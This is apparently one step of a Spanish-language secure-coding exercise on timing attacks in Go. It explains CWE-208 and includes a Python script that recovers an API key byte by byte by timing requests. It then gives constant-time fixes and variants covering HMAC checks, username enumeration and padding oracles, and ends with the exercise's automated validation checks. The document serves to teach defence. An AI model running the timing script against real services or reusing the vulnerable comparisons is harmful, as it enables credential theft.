# Paso 14 — Timing Attack
**Tecnologia:** Go | **OWASP:** A02:2021 - Cryptographic Failures | **CWE-208**

---

## Que es esta vulnerabilidad?

Un timing attack es un ataque de canal lateral donde el atacante mide el tiempo que tarda un servidor en procesar una peticion para deducir informacion sobre datos secretos. El principio se basa en que las operaciones de comparacion de strings en la mayoria de lenguajes terminan en el primer byte diferente: cuantos bytes coincidan al inicio, mas tiempo tarda la comparacion.

Midiendo suficientes peticiones con diferentes prefijos, un atacante puede reconstruir el secreto correcto byte a byte. Con 256 posibles valores por byte y un secreto de 32 bytes, son necesarios 256 * 32 = 8.192 intentos en lugar de 256^32 (fuerza bruta completa).

En la practica, el ataque requiere un gran numero de muestras para superar el ruido de red y del sistema. En entornos locales (microservicios) donde la latencia es muy baja y estable, el ataque es mas viable. Con hardware especializado y estadisticas avanzadas, se ha demostrado exitoso incluso en redes de area ancha.

---

## Donde ocurre en este codigo?

**Archivo:** `src/go/handlers/auth.go`

```go
// CODIGO VULNERABLE — estado actual del ejercicio
func ValidateAPIKey(w http.ResponseWriter, r *http.Request) {
    provided := r.Header.Get("X-API-Key")
    expected := getExpectedKey()
    if provided == expected {  // comparacion que termina en el primer byte diferente
        w.Write([]byte("authorized"))
    } else {
        http.Error(w, "unauthorized", http.StatusUnauthorized)
    }
}
```

El operador `==` en Go (y en la mayoria de lenguajes) usa comparacion de igualdad eficiente: retorna `false` en cuanto encuentra el primer byte diferente. Esto significa:
- Si `provided[0] != expected[0]`: retorna inmediatamente (tiempo minimo)
- Si `provided[0..15] == expected[0..15]` pero `provided[16] != expected[16]`: tarda 16 comparaciones (tiempo mayor)

Esta diferencia de tiempo, aunque en nanosegundos, es estadisticamente detectable.

---

## Como lo explotaria un atacante

**Ataque de timing para descubrir la API key byte a byte:**
```python
import requests, statistics, string, time

def measure_time(prefix: str) -> float:
    # Medir multiples veces para reducir ruido de red
    times = []
    for _ in range(100):
        start = time.perf_counter_ns()
        requests.get('https://api.empresa.com/protected',
                    headers={'X-API-Key': prefix + 'A' * (32 - len(prefix))})
        times.append(time.perf_counter_ns() - start)
    return statistics.median(times)

# Descubrir la key caracter por caracter
discovered = ""
for position in range(32):
    best_char = ''
    best_time = 0
    for char in string.printable:
        t = measure_time(discovered + char)
        if t > best_time:
            best_time = t
            best_char = char
    discovered += best_char
    print(f"Byte {position}: {best_char} | Descubierto hasta ahora: {discovered}")
```

**Precondiciones para el exito:**
- Conexion de baja latencia y jitter al servidor
- Servidor sin rate limiting (o rate limiting permisivo)
- Suficiente entropia estadistica (miles de muestras por byte)

---

## Tu tarea: aplicar la mitigacion

Modifica `src/go/handlers/auth.go` para usar comparacion en tiempo constante:

```go
// CODIGO SEGURO
package handlers

import (
    "crypto/subtle"
    "net/http"
    "os"
)

func getExpectedKey() string {
    key := os.Getenv("API_KEY")
    if key == "" {
        panic("API_KEY environment variable is required")
    }
    return key
}

func ValidateAPIKey(w http.ResponseWriter, r *http.Request) {
    provided := r.Header.Get("X-API-Key")
    expected := getExpectedKey()

    // ConstantTimeCompare siempre recorre todos los bytes, nunca cortocircuita
    // Ademas verifica longitud de forma que no filtra informacion
    if subtle.ConstantTimeCompare([]byte(provided), []byte(expected)) == 1 {
        w.Write([]byte("authorized"))
    } else {
        http.Error(w, "unauthorized", http.StatusUnauthorized)
    }
}
```

### Por que funciona esta mitigacion?

- **`subtle.ConstantTimeCompare`:** implementada usando operaciones XOR que siempre recorren todos los bytes de ambos strings. El tiempo de ejecucion depende solo de la longitud de los strings, nunca de cuantos bytes coincidan. No hay "cortocircuito" temprano.
- **Longitud constante:** `ConstantTimeCompare` devuelve `0` si las longitudes son distintas, sin comparar bytes. Esto tambien evita filtrar informacion de longitud aunque el tiempo sea diferente para strings de diferente longitud.
- **Secreto desde entorno:** carga `API_KEY` desde variable de entorno, nunca hardcodeada en el codigo. Falla con `panic` al arranque si falta, lo que es correcto: mejor fallar en startup que operar sin autenticacion.

---

## Variantes de la misma categoria (Cryptographic Failures via Timing — mas complejas)

### Variante A: Timing Attack en verificacion de HMAC

```python
# VULNERABLE — comparacion directa de HMAC permite timing attack
import hmac, hashlib

def verify_webhook(payload: bytes, signature: str, secret: str) -> bool:
    expected = hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()
    return signature == expected  # termina en el primer byte diferente
```

```python
# SEGURO — usar hmac.compare_digest (tiempo constante)
import hmac, hashlib

def verify_webhook(payload: bytes, signature: str, secret: str) -> bool:
    expected = hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()
    return hmac.compare_digest(signature, expected)  # tiempo constante
```

`hmac.compare_digest` en Python es el equivalente de `subtle.ConstantTimeCompare` en Go. Usa XOR interno sobre todos los bytes.

---

### Variante B: Username Enumeration via diferencia de tiempo

```java
// VULNERABLE — fallar rapido si el usuario no existe, lento si la contrasena es incorrecta
@PostMapping("/login")
public ResponseEntity<?> login(@RequestParam String username, @RequestParam String password) {
    User user = userRepository.findByUsername(username);  // consulta a DB
    if (user == null) {
        return ResponseEntity.status(401).build();  // respuesta rapida: usuario no existe
    }
    // bcrypt.verify tarda ~100ms: respuesta lenta si contrasena incorrecta
    if (!bcrypt.verify(password, user.getPasswordHash())) {
        return ResponseEntity.status(401).build();
    }
    return ResponseEntity.ok(generateToken(user));
}
```

El atacante puede distinguir "usuario no existe" (respuesta rapida) de "usuario existe pero contrasena incorrecta" (respuesta lenta) por diferencia de tiempo, enumerando usuarios validos.

```java
// SEGURO — tiempo constante independientemente de si el usuario existe
@PostMapping("/login")
public ResponseEntity<?> login(@RequestParam String username, @RequestParam String password) {
    User user = userRepository.findByUsername(username);
    String hashToVerify = (user != null)
        ? user.getPasswordHash()
        : "$2a$10$dummy_hash_to_waste_same_time_as_real_verification";
    // Siempre ejecutar bcrypt.verify para mantener tiempo constante
    boolean valid = bcrypt.verify(password, hashToVerify) && user != null;
    if (!valid) {
        return ResponseEntity.status(401).build();
    }
    return ResponseEntity.ok(generateToken(user));
}
```

---

### Variante C: Padding Oracle Attack (CBC decryption oracle)

Un padding oracle es una forma avanzada de timing/error attack donde el servidor revela si el padding de un bloque AES-CBC es valido:

```java
// VULNERABLE — el servidor devuelve errores diferentes para padding invalido vs. MAC invalido
@PostMapping("/decrypt")
public ResponseEntity<?> decrypt(@RequestBody String ciphertext) {
    try {
        byte[] decrypted = aesCbcDecrypt(ciphertext);
        return ResponseEntity.ok(decrypted);  // OK: padding y MAC validos
    } catch (BadPaddingException e) {
        return ResponseEntity.status(400).body("Invalid padding");  // filtra info de padding
    } catch (InvalidMACException e) {
        return ResponseEntity.status(400).body("Invalid MAC");  // respuesta diferente
    }
}
```

Con esta diferencia de errores, un atacante puede descifrar cualquier ciphertext byte a byte sin conocer la clave (ataque de Vaudenay, 2002).

```java
// SEGURO — usar AEAD (AES-GCM) en lugar de AES-CBC + HMAC separado
// AES-GCM verifica integridad y descifra en una sola operacion atomica
// Si el tag de autenticacion falla, no hay ninguna informacion de padding
@PostMapping("/decrypt")
public ResponseEntity<?> decrypt(@RequestBody String ciphertext) {
    try {
        byte[] decrypted = aesGcmDecrypt(ciphertext);  // AEAD: un solo error generico
        return ResponseEntity.ok(decrypted);
    } catch (AEADBadTagException e) {
        return ResponseEntity.status(400).body("Decryption failed");  // error generico
    }
}
```

---

## Referencias

- [OWASP A02:2021 - Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
- [CWE-208: Observable Timing Discrepancy](https://cwe.mitre.org/data/definitions/208.html)
- [Go crypto/subtle documentation](https://pkg.go.dev/crypto/subtle)
- [Padding Oracle Attack - Vaudenay 2002](https://www.iacr.org/archive/eurocrypt2002/23320530/cbc02_e02d.pdf)

---

## Lo que valida el workflow automaticamente

El workflow **Validate Step 14** exige que `src/go/handlers/auth.go` contenga:
- `subtle.ConstantTimeCompare`
- `os.Getenv("API_KEY")`
- La ausencia de `provided == expected`